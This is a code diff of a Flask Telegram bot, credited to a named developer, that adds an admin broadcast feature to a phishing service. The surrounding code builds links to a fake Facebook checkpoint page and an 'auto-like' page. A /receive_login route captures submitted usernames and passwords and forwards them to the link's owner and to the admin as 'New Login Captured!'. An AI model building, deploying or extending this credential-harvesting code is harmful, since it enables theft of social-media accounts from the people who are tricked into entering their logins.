@@ -1,6 +1,6 @@
 # ==============================
 # VS BOT — Railway Full Updated
-# With Admin Bot + Direct Link + Auto-Like URL
+# With Admin Bot + Direct Link + Auto-Like URL + Broadcast System
 # Developer: @noobxvau (MN Siddik)
 # ==============================
 
@@ -28,8 +28,6 @@ FRONTEND_FB_BASE = "fb-check-point.netlify.app"         # Facebook page
 FRONTEND_LIKE_BASE = "auto-like-free.netlify.app"        # Auto-Like page
 
 USERS_FILE = "users.json"
-# -------------------------
-
 registered_users = {}
 
 # -------------------------
@@ -78,7 +76,7 @@ def make_autolike_url(chat_id):
     return f"{FRONTEND_LIKE_BASE}/index.html?uid={chat_id}"
 
 # -------------------------
-# Telegram Webhook
+# Telegram Webhook for USER BOT
 # -------------------------
 @app.route(f"/{BOT_TOKEN}", methods=["POST"])
 def telegram_webhook():
@@ -101,11 +99,49 @@ def telegram_webhook():
             )
             send_message(chat_id, welcome)
 
-            # ইউজার রেজিস্টার করা
             registered_users[str(chat_id)] = True
             save_users()
             print(f"✅ User {chat_id} registered.")
     return jsonify({"status": "ok"})
+
+# -------------------------
+# Telegram Webhook for ADMIN BOT
+# -------------------------
+@app.route(f"/{ADMIN_BOT_TOKEN}", methods=["POST"])
+def admin_webhook():
+    data = request.get_json(silent=True) or {}
+    if "message" in data:
+        admin_id = data["message"]["chat"]["id"]
+        text = data["message"].get("text", "")
+
+        if str(admin_id) != ADMIN_CHAT_ID:
+            send_admin_message("❌ You are not authorized to send broadcast messages!")
+            return jsonify({"status": "unauthorized"})
+
+        if text.lower().strip() == "/broadcast":
+            send_admin_message("📝 Send the message you want to broadcast to all users.")
+            registered_users["awaiting_broadcast"] = True
+            save_users()
+        elif registered_users.get("awaiting_broadcast"):
+            registered_users.pop("awaiting_broadcast", None)
+            save_users()
+
+            broadcast_message(text)
+            send_admin_message("✅ Message broadcasted to all users successfully!")
+        else:
+            send_admin_message("ℹ️ Use /broadcast first to start broadcasting.")
+    return jsonify({"status": "ok"})
+
+# -------------------------
+# Broadcast Function
+# -------------------------
+def broadcast_message(message):
+    count = 0
+    for uid in registered_users.keys():
+        if uid.isdigit():
+            send_message(uid, f"📢 *Admin Message:*\n\n{message}")
+            count += 1
+    print(f"📨 Broadcast sent to {count} users.")
 
 # -------------------------
 # Login info receive route
@@ -119,14 +155,9 @@ def receive_login():
     
     if uid and uid in registered_users:
         msg = f"🧾 *Login Info*\n👤 *Username:* `{username}`\n🔑 *Password:* `{password}`"
-        
-        # ইউজারকেও পাঠাও (login info)
         send_message(uid, msg)
-
-        # এডমিনকেও পাঠাও
         admin_text = f"📩 *New Login Captured!*\n👤 *UID:* `{uid}`\n{msg}"
         send_admin_message(admin_text)
-
         print(f"✅ Sent login info to user {uid} and admin.")
         return jsonify({"status": "sent"})
     else:
@@ -137,21 +168,25 @@ def receive_login():
 # -------------------------
 @app.route('/')
 def home():
-    return "✅ Bot server running with Admin and User notifications!"
+    return "✅ Bot server running with Admin Broadcast system!"
 
 # -------------------------
 # Main
 # -------------------------
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
-    
-    # Telegram webhook auto-set (Railway)
+
+    # Auto webhook for both bots
     public_url = os.environ.get("RAILWAY_STATIC_URL") or os.environ.get("RAILWAY_PUBLIC_URL")
     if public_url:
-        webhook_url = f"{public_url}/{BOT_TOKEN}"
         try:
-            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}")
-            print("✅ Telegram webhook set:", r.text)
+            # Main bot webhook
+            r1 = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={public_url}/{BOT_TOKEN}")
+            print("✅ Main bot webhook set:", r1.text)
+
+            # Admin bot webhook
+            r2 = requests.get(f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/setWebhook?url={public_url}/{ADMIN_BOT_TOKEN}")
+            print("✅ Admin bot webhook set:", r2.text)
         except Exception as e:
             print("❌ Failed to set webhook:", e)
     else:
